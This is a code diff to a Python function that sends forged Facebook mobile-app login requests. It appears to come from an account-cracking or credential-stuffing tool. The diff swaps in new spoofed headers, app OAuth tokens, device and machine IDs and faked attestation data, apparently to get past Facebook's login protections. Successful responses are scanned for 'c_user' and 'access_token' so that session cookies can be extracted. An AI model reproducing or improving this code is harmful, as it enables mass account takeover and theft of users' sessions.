@@ -1590,95 +1590,127 @@ def x(uid,pwx,tl):
             machine_id_val = generate_machine_id()
             usdid_val = generate_usdid()
             headers = {
-            'host': 'b-graph.facebook.com',
-            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
-            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
-            'priority': 'u=0',
-            'content-encoding': 'gzip',
-            'x-fb-device-group': '7637',
-            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
-            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
-            'user-agent': generate_random_orca_agent(),
-            'x-graphql-request-purpose': 'fetch',
-            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
-            'x-tigon-is-retry': 'False',
-            'x-zero-state': 'unknown',
-            'x-graphql-client-library': 'graphservice',
-            'x-fb-sim-hni': '51011',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-net-hni': '51011',
-            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'x-meta-zca': 'empty_token',
-            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
-            'x-fb-connection-type': 'MOBILE.LTE',
-            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
-            # 'accept-encoding': 'gzip, deflate',
-            'x-fb-http-engine': 'Tigon/Liger',
-            'x-fb-client-ip': 'True',
-            'x-fb-server-cluster': 'True',
-            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}
+    "Host": "b-graph.facebook.com",
+    "X-Tigon-Is-Retry": "False",
+    "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
+    "X-Fb-Sim-Hni": "51000",
+    "X-Fb-Net-Hni": "51000",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "X-Iorg-Bsid": "cef4b24e-3af1-4333-bb9a-cde46e637ee7",
+    "X-Graphql-Client-Library": "graphservice",
+    "X-Fb-Friendly-Name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
+    "User-Agent": generate_random_orca_agent(),
+    "Content-Encoding": "gzip",
+    "X-Zero-Eh": "664c0faaac849cb891d0a261fbb72a12",
+    "X-Zero-State": "unknown",
+    "X-Fb-Connection-Type": "WIFI",
+    "Priority": "u=3, i",
+    "X-Fb-Rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=1756921072",
+    "X-Fb-Request-Analytics-Tags": '{"network_tags":{"product":"256002347743983","purpose":"none","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
+    "Accept-Encoding": "gzip, deflate, br",
+    "X-Fb-Http-Engine": "Tigon/Liger",
+    "X-Fb-Client-Ip": "True",
+    "X-Fb-Server-Cluster": "True",
+}
             apcb = '#PWD_MSGR:0:{}:{}'.format(str(int(time.time())), pw)
             params = {
-                "method": "post",
-                "pretty": "false",
-                "format": "json",
-                "server_timestamps": "true",
-                "locale": "id_ID",
-                "purpose": "fetch",
-                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
-                "fb_api_caller_class": "graphservice",
-                "client_doc_id": "119940804217734265480409226803",
-                "fb_api_client_context": json.dumps({
-                    "is_background": False
-                }),
-                "variables": json.dumps({
-                    "params": {
-                        "params": json.dumps({
-                            "params": json.dumps({
-                                "server_params": {
-                                    "device_id": device_id_val,
-                                    "server_login_source": "login",
-                                    "waterfall_id": str(uuid.uuid4()),
-                                    "attestation_result": {
-                                        "errorMessage": "KeyAttestationException: No key found!"
-                                    },
-                                    "machine_id": machine_id_val,
-                                    "from_native_screen": True,
-                                    "credential_type": "password",
-                                    "password": apcb,
-                                    "try_num": "1",
-                                    "family_device_id": family_device_id_val,
-                                    "event_flow": "login_manual",
-                                    "event_step": "home_page",
-                                    "is_from_logged_in_switcher": False,
-                                    "contact_point": uid,
-                                }
-                            })
-                        }),
-                        "bloks_versioning_id": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
-                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+    "method": "post",
+    "pretty": "false",
+    "format": "json",
+    "server_timestamps": "true",
+    "locale": "id_ID",
+    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
+    "fb_api_caller_class": "graphservice",
+    "client_doc_id": "119940804216663295833025359905",
+    "fb_api_client_context": {"is_background": False},
+    "variables": json.dumps({
+        "params": {
+            "params": json.dumps({
+                "client_input_params": {
+                    "blocked_uids": [],
+                    "aac": "{\"aac_init_timestamp\":1781434103,\"aacjid\":\"1223a659-19fb-4c8d-9735-f89e12a1a4a2\",\"aaccs\":\"3XcWErexKcNOdRZVOdkSrMvcnVSROsTSyct7babVClk\"}",
+                    "sim_phones": [""],
+                    "aymh_accounts": [],
+                    "network_bssid": None,
+                    "secure_family_device_id": "86aa9df8-8391-4c69-9b37-c9bcf487a626",
+                    "attestation_result": {
+                        "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiJQc0VhTFJVZXFKZDNaVUZNYndyNjgzKy93UVAvRVFCSjI5K3BpYThXMWdnPSIsInVzZXJuYW1lIjoibG9wYWRhZGFzZGFkYSJ9",
+                        "signature": "MEQCIH2H5bPs8ewYi421HimJxtqeW7vmc+SeI71SNsBPhIOGAiBiKjPu00LUjegos6pG9Ol5F37MeuhHkB7OAFw5+HsZYQ==",
+                        "keyHash": "6f40e2b9b3f1b0a2fb223ff91daab06b93c5587cc0d9db988c737b0c47220a0c"
                     },
-                    "scale": "2",
-                    "nt_context": {
-                        "using_white_navbar": True,
-                        "styles_id": "6100e7e89411ccf67ace027cedecd84f",
-                        "pixel_ratio": 2,
-                        "is_push_on": True,
-                        "debug_tooling_metadata_token": None,
-                        "is_flipper_enabled": False,
-                        "theme_params": [
-                            {
-                                "value": [],
-                                "design_system_name": "FDS"
-                            }
-                        ],
-                        "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
-                    }
-                }),
-                "fb_api_analytics_tags": json.dumps(["GraphServices"]),
-                "client_trace_id": str(uuid.uuid4()),
-            }
+                    "has_granted_read_contacts_permissions": 0,
+                    "auth_secure_device_id": "",
+                    "has_whatsapp_installed": 1,
+                    "password": apcb,
+                    "sso_token_map_json_string": "",
+                    "block_store_machine_id": "",
+                    "cloud_trust_token": None,
+                    "event_flow": "login_manual",
+                    "password_contains_non_ascii": "false",
+                    "client_known_key_hash": "",
+                    "sso_accounts_auth_data": [],
+                    "encrypted_msisdn": "",
+                    "has_granted_read_phone_permissions": 0,
+                    "app_manager_id": "",
+                    "should_show_nested_nta_from_aymh": 0,
+                    "device_id": "cef4b24e-3af1-4333-bb9a-cde46e637ee7",
+                    "zero_balance_state": "",
+                    "login_attempt_count": 1,
+                    "machine_id": "MlMmahAZ9nZeHnaFggyXvkg0",
+                    "accounts_list": [],
+                    "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                    "family_device_id": "3c02a314-ffb1-464f-9d8d-6c5d48019f1e",
+                    "fb_ig_device_id": [],
+                    "device_emails": [],
+                    "try_num": 1,
+                    "lois_settings": {"lois_token": ""},
+                    "event_step": "home_page",
+                    "headers_infra_flow_id": "",
+                    "openid_tokens": {},
+                    "contact_point": uid
+                },
+                "server_params": {
+                    "should_trigger_override_login_2fa_action": 0,
+                    "is_from_logged_out": 0,
+                    "should_trigger_override_login_success_action": 0,
+                    "login_credential_type": "none",
+                    "server_login_source": "login",
+                    "waterfall_id": "2729e81d-8373-4587-9d28-9b26d91f777a",
+                    "two_step_login_type": "one_step_login",
+                    "login_source": "Login",
+                    "is_platform_login": 0,
+                    "pw_encryption_try_count": 1,
+                    "login_entry_point": "logged_out",
+                    "INTERNAL__latency_qpl_marker_id": 36707139,
+                    "is_from_aymh": 0,
+                    "offline_experiment_group": "caa_iteration_v3_perf_msg_6",
+                    "is_from_landing_page": 0,
+                    "left_nav_button_action": "NONE",
+                    "password_text_input_id": "nvb5wc:95",
+                    "is_from_empty_password": 0,
+                    "is_from_msplit_fallback": 0,
+                    "ar_event_source": "login_home_page",
+                    "username_text_input_id": "nvb5wc:94",
+                    "layered_homepage_experiment_group": None,
+                    "device_id": "cef4b24e-3af1-4333-bb9a-cde46e637ee7",
+                    "login_surface": "login_home",
+                    "INTERNAL__latency_qpl_instance_id": 1.44331100400549E14,
+                    "reg_flow_source": "login_home_native_integration_point",
+                    "is_caa_perf_enabled": 1,
+                    "credential_type": "password",
+                    "is_from_password_entry_page": 0,
+                    "caller": "gslr",
+                    "family_device_id": "3c02a314-ffb1-464f-9d8d-6c5d48019f1e",
+                    "is_from_assistive_id": 0,
+                    "access_flow_version": "pre_mt_behavior",
+                    "is_from_logged_in_switcher": 0
+                }
+            }),
+        },
+    }),
+    "bloks_versioning_id": "9331af72e2c20ac63fea39c6d6b2d22641149512b1b9f2a6e3ba2b6def08dbea",
+    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+}
             response = Session.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
             if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
